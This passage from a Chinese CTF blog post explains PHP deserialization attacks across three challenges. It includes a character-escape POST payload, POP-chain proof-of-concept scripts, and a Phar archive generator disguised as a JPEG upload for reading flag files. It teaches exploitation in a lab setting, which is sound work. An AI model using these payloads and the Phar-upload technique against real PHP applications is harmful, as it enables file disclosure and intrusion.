+<span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>$_GET[<span style=color:#e6db74>&#39;img_path&#39;</span>]){
+    $_SESSION[<span style=color:#e6db74>&#39;img&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>(<span style=color:#e6db74>&#39;guest_img.png&#39;</span>);
+}<span style=color:#66d9ef>else</span>{
+    $_SESSION[<span style=color:#e6db74>&#39;img&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>sha1</span>(<span style=color:#a6e22e>base64_encode</span>($_GET[<span style=color:#e6db74>&#39;img_path&#39;</span>]));
+}
+
+$serialize_info <span style=color:#f92672>=</span> <span style=color:#a6e22e>filter</span>(<span style=color:#a6e22e>serialize</span>($_SESSION));
+
+<span style=color:#66d9ef>if</span>($function <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;highlight_file&#39;</span>){
+    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#e6db74>&#39;index.php&#39;</span>);
+}<span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>($function <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;phpinfo&#39;</span>){
+    <span style=color:#66d9ef>eval</span>(<span style=color:#e6db74>&#39;phpinfo();&#39;</span>); <span style=color:#75715e>//maybe you can find something in here!
+</span><span style=color:#75715e></span>}<span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>($function <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;show_image&#39;</span>){
+    $userinfo <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($serialize_info);
+    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#a6e22e>base64_decode</span>($userinfo[<span style=color:#e6db74>&#39;img&#39;</span>]));
+}
+</code></pre></div><ol>
+<li>先查看phpinfo，发现敏感文件泄露：<code>d0g3_f1ag.php</code>，即使用<code>file_get_contents</code>读该文件</li>
+<li>存在过滤，以及使用sha1函数替换了用户传入的<code>img_path</code>，sha1和base64应该是不太可能碰撞的，考虑绕过过滤。</li>
+<li>过滤方式是简单替换为空，存在绕过的可能。</li>
+</ol>
+<h4 id=知识点>知识点<a hidden class=anchor aria-hidden=true href=#知识点>#</a></h4>
+<ol>
+<li>
+<p>本题的<code>$_SESSION</code>其实并不是PHP的自带变量，而是用户定义的变量，我们在<code>extract($_POST)</code>这里通过POST方式控制其内容。</p>
+</li>
+<li>
+<p><strong>不是只有类和对象才有序列化和反序列化</strong>，类、对象、数组、变量均可进行序列化。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#a6e22e>a</span> <span style=color:#f92672>-</span> <span style=color:#66d9ef>array</span>
+<span style=color:#a6e22e>b</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>boolean</span>
+<span style=color:#a6e22e>d</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>double</span>
+<span style=color:#a6e22e>i</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>integer</span>
+<span style=color:#a6e22e>o</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>common</span> <span style=color:#a6e22e>object</span>
+<span style=color:#a6e22e>r</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>reference</span>
+<span style=color:#a6e22e>s</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>string</span>
+<span style=color:#a6e22e>C</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>custom</span> <span style=color:#a6e22e>object</span>
+<span style=color:#a6e22e>O</span> <span style=color:#f92672>-</span> <span style=color:#66d9ef>class</span>
+<span style=color:#a6e22e>N</span> <span style=color:#f92672>-</span> <span style=color:#66d9ef>null</span>
+<span style=color:#a6e22e>R</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>pointer</span> <span style=color:#a6e22e>reference</span>
+<span style=color:#a6e22e>U</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>unicode</span> <span style=color:#a6e22e>string</span>
+</code></pre></div></li>
+<li>
+<p>PHP进行反序列化时，并不要求字符串严格按照格式，而是按照从左至右的顺序和预先安排的字符个数进行依次读取。</p>
+<p>故而在未遇到字符串尾：<code>;</code>和读满字符个数之前，会将遇到的所有字符当作相应的对象名或内容。</p>
+</li>
+</ol>
+<h4 id=php-反序列化字符逃逸>PHP 反序列化字符逃逸<a hidden class=anchor aria-hidden=true href=#php-反序列化字符逃逸>#</a></h4>
+<blockquote>
+<p>字符逃逸的本质即为闭合。分为两种情况，一是字符变多，二是字符变少。</p>
+</blockquote>
+<p>本题存在过滤后字符变少的情况。</p>
+<p>由于程序会将<code>$_SESSION['img']</code>设置为固定值，我们要控制改变这里的值，需要让程序错位读取我们设置的值。</p>
+<ul>
+<li>
+<p>我们希望的<code>img</code>序列化结果(读取base64编码后的<code>d0g3_f1ag.php</code>)：</p>
+<p><code>s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";</code></p>
+</li>
+<li>
+<p>我们可以在程序反序列化时，添加一个新的数组元素，覆盖掉原有的img元素，类似于SQL注入</p>
+<p><code>$_SESSION['xx']='";s:3:"abc";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'</code></p>
+</li>
+<li>
+<p><code>$_SESSION</code>序列化后：</p>
+<p><code> a:1:{s:2:"xx";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";}</code></p>
+</li>
+<li>
+<p>此时数一下多余的字符数：<code>;s:51:""</code>为8个，可用<code>flagflag</code>拼凑</p>
+</li>
+<li>
+<p><code> a:1:{s:8:"flagflag";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";}</code></p>
+</li>
+<li>
+<p>被过滤后，变成了：<code> a:1:{s:8:"";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";}</code>，此时，原先多余的八个字符正好会被当作第一个元素的名字，而<code>s:3:"aaa"</code>即为它的值，而后面的<code>img</code>参数能被正常解析成功！</p>
+</li>
+</ul>
+<p><strong>Payload</strong></p>
+<p>POST： <code>$_SESSION['flagflag']=";s:3:"abc";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}</code></p>
+<p>(去掉两个单引号是因为http协议中的post请求无需用引号覆盖，而PHP的字符串内容需要单引号)</p>
+<h3 id=mrctf2020ezpop>[MRCTF2020]Ezpop<a hidden class=anchor aria-hidden=true href=#mrctf2020ezpop>#</a></h3>
+<p>本题与POP链构造的实例相同，需要注意的是最后的文件读取用的是文件包含<code>include</code>的函数，故而需要用到文件包含的<code>php://filter</code>伪协议。</p>
+<p><strong>POC</strong></p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Modifier</span>{
+        <span style=color:#66d9ef>protected</span> $var<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;php://filter/convert.base64-encode/resource=flag.php&#39;</span>;
+    }
+    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Show</span>{
+        <span style=color:#66d9ef>public</span> $source;
+        <span style=color:#66d9ef>public</span> $str;
+        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($file<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;flag.php&#39;</span>){
+            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span> <span style=color:#f92672>=</span> $file;
+            <span style=color:#75715e>// echo &#39;Welcome to &#39;.$this-&gt;source.&#34;&lt;br&gt;&#34;;
+</span><span style=color:#75715e></span>        }
+    }
+    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span>{
+        <span style=color:#66d9ef>public</span> $p;
+
+    }
+    $modifier <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Modifier</span>();
+    $show <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Show</span>();
+    $test <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Test</span>();
+    $test<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> $modifier;
+    $show<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span> <span style=color:#f92672>=</span> $test;
+    $show<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span> <span style=color:#f92672>=</span> $show;
+    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>serialize</span>($show));
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><h3 id=swpuctf-2018simplephp>[SWPUCTF 2018]SimplePHP<a hidden class=anchor aria-hidden=true href=#swpuctf-2018simplephp>#</a></h3>
+<p>本题考察知识点为</p>
+<ul>
+<li>文件包含</li>
+<li>利用Phar进行反序列化</li>
+</ul>
+<p>进入题目，发现存在一个文件包含和一个文件上传点，先利用文件包含读取<code>file.php</code>和<code>upload_file.php</code>的源代码，发现文件上传过滤严格，似乎不存在可以绕过的漏洞，只能上传图片格式。而<code>file.php</code>中还包含了<code>function.php</code>和<code>class.php</code>，第一个提示flag在<code>f1ag.php</code>中，第二个则明显是要进行POP链的构造。</p>
+<p><code>class.php</code>内容</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>C1e4r</span>
+{
+    <span style=color:#66d9ef>public</span> $test;
+    <span style=color:#66d9ef>public</span> $str;
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($name)
+    {
+        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span> <span style=color:#f92672>=</span> $name;
+    }
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __destruct()
+    {
+        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>test</span> <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span>;
+        <span style=color:#66d9ef>echo</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>test</span>;
+    }
+}
+
+<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Show</span>
+{
+    <span style=color:#66d9ef>public</span> $source;
+    <span style=color:#66d9ef>public</span> $str;
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($file)
+    {
+        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span> <span style=color:#f92672>=</span> $file;   <span style=color:#75715e>//$this-&gt;source = phar://phar.jpg
+</span><span style=color:#75715e></span>        <span style=color:#66d9ef>echo</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>;
+    }
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __toString()
+    {
+        $content <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span>[<span style=color:#e6db74>&#39;str&#39;</span>]<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>;
+        <span style=color:#66d9ef>return</span> $content;
+    }
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __set($key,$value)
+    {
+        <span style=color:#75715e>// 在给不可访问（protected 或 private）或不存在的属性赋值时 调用Set
+</span><span style=color:#75715e></span>        $this<span style=color:#f92672>-&gt;</span>$key <span style=color:#f92672>=</span> $value;
+    }
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>_show</span>()
+    {
+        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;</span>,$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>)) {
+            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;hacker!&#39;</span>);
+        } <span style=color:#66d9ef>else</span> {
+            <span style=color:#a6e22e>highlight_file</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>);
+        }
+        
+    }
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __wakeup()
+    {
+        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/http|https|file:|gopher|dict|\.\./i&#34;</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>)) {
+            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;hacker~&#34;</span>;
+            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;index.php&#34;</span>;
+        }
+    }
+}
+<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span>
+{
+    <span style=color:#66d9ef>public</span> $file;
+    <span style=color:#66d9ef>public</span> $params;
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct()
+    {
+        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>params</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();
+    }
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __get($key)
+    {
+        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get</span>($key);
+    }
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>get</span>($key)
+    {
+        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>params</span>[$key])) {
+            $value <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>params</span>[$key];
+        } <span style=color:#66d9ef>else</span> {
+            $value <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;index.php&#34;</span>;
+        }
+        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file_get</span>($value);
+    }
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>file_get</span>($value)
+    {
+        $text <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>file_get_contents</span>($value));
+        <span style=color:#66d9ef>return</span> $text;
+    }
+}
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>标注出所有魔术方法后，可以找到如下的POP链：</p>
+<p><code>C1e4r.__destruct->Show.__set->Show.__toString->Test.params[$key]->Test.file_get</code></p>
+<p>即可构造POP链</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>C1e4r</span>
+{
+    <span style=color:#66d9ef>public</span> $test;
+    <span style=color:#66d9ef>public</span> $str;
+}
+
+<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Show</span>
+{
+    <span style=color:#66d9ef>public</span> $source;
+    <span style=color:#66d9ef>public</span> $str;
+}
+
+<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span>
+{
+    <span style=color:#66d9ef>public</span> $file;
+    <span style=color:#66d9ef>public</span> $params;
+}
+$c1e4r <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>C1e4r</span>();
+$show <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Show</span>();
+$test <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Test</span>();
+$c1e4r<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span> <span style=color:#f92672>=</span> $show;
+$show<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span>[<span style=color:#e6db74>&#39;str&#39;</span>] <span style=color:#f92672>=</span> $test;
+$test<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>params</span>[<span style=color:#e6db74>&#39;source&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;f1ag.php&#39;</span>;
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>但是，反序列化入口在哪里？所有的源代码中都没有反序列化函数<code>unserialize</code></p>
+<h4 id=phar反序列化>Phar反序列化<a hidden class=anchor aria-hidden=true href=#phar反序列化>#</a></h4>
+<p>这时候，就要利用隐藏的反序列化入口-<code>Phar://</code></p>
+<blockquote>
+<p><code>Phar</code>方法在 文件系统函数 （ file_get_contents 、 unlink 等）参数可控的情况下，配合 phar://伪协议 ，可以不依赖反序列化函数 unserialize() 直接进行反序列化的操作。</p>
+</blockquote>
+<p>PHP大部分的文件系统函数在通过<code>phar://</code>伪协议解析<code>phar</code>包文件时，都会将文件结构中<code>meta-data</code>的部分进行反序列化。</p>
+<p>同时， <code>phar </code>文件必须以<code>__HALT_COMPILER();?></code>来结尾，那么<strong>可以通过添加任意的文件头+修改后缀名的方式将<code>phar</code>文件伪装成其他格式的文件。</strong></p>
+<p>生成<code>Phar</code>包文件的代码是固定的：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>$phar <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Phar</span>(<span style=color:#e6db74>&#34;exp.phar&#34;</span>); <span style=color:#75715e>//生成.phar文件，此处填写的后缀名必须是.phar，但phar://协议不限于只解析.phar文件
+</span><span style=color:#75715e></span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>startBuffering</span>();
+$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>setStub</span>(<span style=color:#e6db74>&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;</span>); <span style=color:#75715e>//固定的，可以在此处添加伪造的文件头
+</span><span style=color:#75715e></span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>setMetadata</span>($c1e4r); <span style=color:#75715e>//触发的头是C1e4r类，所以传入C1e4r对象，此处即为对$c1e4r进行序列化的操作
+</span><span style=color:#75715e></span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>addFromString</span>(<span style=color:#e6db74>&#34;exp.txt&#34;</span>, <span style=color:#e6db74>&#34;test&#34;</span>); <span style=color:#75715e>//随便写，生成签名
+</span><span style=color:#75715e></span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>stopBuffering</span>();
+</code></pre></div><p>完成后便会生成在同目录下生成一个<code>exp.phar</code>文件，手动修改文件拓展名为<code>.jpg</code>（之前查看<code>upload_file.php</code>源代码发现没有检查文件头，故更改文件后缀即可），上传，找到位置，在文件包含处使用<code>phar://</code>协议包含该jpg文件，即可通过POP链读取flag文件。</p>
+<h4 id=phar反序列化的条件>Phar反序列化的条件<a hidden class=anchor aria-hidden=true href=#phar反序列化的条件>#</a></h4>
+<p>根据该题，可以总结出需要满足以下三个条件：</p>
+<ol>
+<li>需要存在POP链，末端可以获得flag的方法</li>
+<li>需要文件上传入口，上传<code>phar</code>包</li>
+<li>需要文件包含，利用<code>phar://</code>伪协议读取<code>phar</code>包</li>
+</ol>
+<p>除此之外，<code>Postgresql</code>和<code>Mysql</code>中也都有函数可以利用<code>phar://</code>伪协议进行反序列化操作。</p>
+<h2 id=参考>参考<a hidden class=anchor aria-hidden=true href=#参考>#</a></h2>
+<ol>
+<li><a href=https://as1def.github.io/2020/10/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CPOP%E9%93%BE%E6%9E%84%E9%80%A0/>PHP反序列化和POP链构造 - As1def&rsquo;s Blog</a></li>
+<li><a href=https://www.freebuf.com/articles/web/247930.html>一题教你学会构造PHP反序列化POP链 - FreeBuf</a></li>
+<li><a href=https://ca01h.top/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96>BUUCTF刷题——PHP反序列化 - CA01H' Blog</a></li>
+<li><a href=https://xz.aliyun.com/t/9213>PHP 反序列化字符逃逸 - 先知社区</a></li>
+<li><a href=https://xz.aliyun.com/t/6699>PHP反序列化拓展攻击Phar详解 - 先知社区</a></li>
+</ol>
+</div>
+<footer class=post-footer>
+<ul class=post-tags>
+<li><a href=https://shenyiming.life/tags/ctf/>CTF</a></li>
+<li><a href=https://shenyiming.life/tags/php/>PHP</a></li>
+<li><a href=https://shenyiming.life/tags/web/>Web</a></li>
+<li><a href=https://shenyiming.life/tags/note/>Note</a></li>
+</ul>
+<nav class=paginav>
+<a class=prev href=https://shenyiming.life/post/ctf/ctf%E6%AF%94%E8%B5%9B%E6%96%B9%E5%90%91%E9%80%89%E6%8B%A9/>
+<span class=title>« Prev Page</span>
+<br>
+<span>CTF比赛方向选择&学习内容</span>
+</a>
+<a class=next href=https://shenyiming.life/post/ctf/wp/ciscnwp/>
+<span class=title>Next Page »</span>
+<br>
+<span>CISCN Crypt0 战队 WRITEUP</span>
+</a>
+</nav>
+<div class=share-buttons>
+<a target=_blank rel="noopener noreferrer" aria-label="share PHP 反序列化 on twitter" href="https://twitter.com/intent/tweet/?text=PHP%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96&url=https%3a%2f%2fshenyiming.life%2fpost%2fctf%2funserialize%2fphp%2f&hashtags=CTF%2cPHP%2cWeb%2cNote"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share PHP 反序列化 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fshenyiming.life%2fpost%2fctf%2funserialize%2fphp%2f&title=PHP%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96&summary=PHP%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96&source=https%3a%2f%2fshenyiming.life%2fpost%2fctf%2funserialize%2fphp%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share PHP 反序列化 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fshenyiming.life%2fpost%2fctf%2funserialize%2fphp%2f&title=PHP%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share PHP 反序列化 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fshenyiming.life%2fpost%2fctf%2funserialize%2fphp%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share PHP 反序列化 on whatsapp" href="https://api.whatsapp.com/send?text=PHP%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%20-%20https%3a%2f%2fshenyiming.life%2fpost%2fctf%2funserialize%2fphp%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 